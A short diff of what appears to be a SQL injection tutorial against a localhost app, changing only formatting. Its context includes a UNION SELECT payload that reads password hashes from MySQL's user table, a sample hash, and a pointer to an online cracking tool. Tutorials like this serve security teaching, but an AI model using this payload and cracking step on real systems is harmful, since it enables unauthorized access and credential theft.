@@ -29,11 +29,11 @@ http://localhost:8080/p/2 UNION SELECT 1,(SELECT authentication_string FROM mysq
 
 
 The result will be something like this: 
-```shell
+```javascript
 *14594DCDEA27F5322936D6F1143F8C4F3B8F5A3E
 ```
 
 This is a **41 bytes MySQL (4.1.1) hash**.
-To get a clear text password you will have to break it. For this task you can use an online tool, for example => https://crackstation.net/
+To get a clear text password you will have to break it. For this task you can use an online tool, for example => [https://crackstation.net/](https://crackstation.net/)
 
 And that is it!!
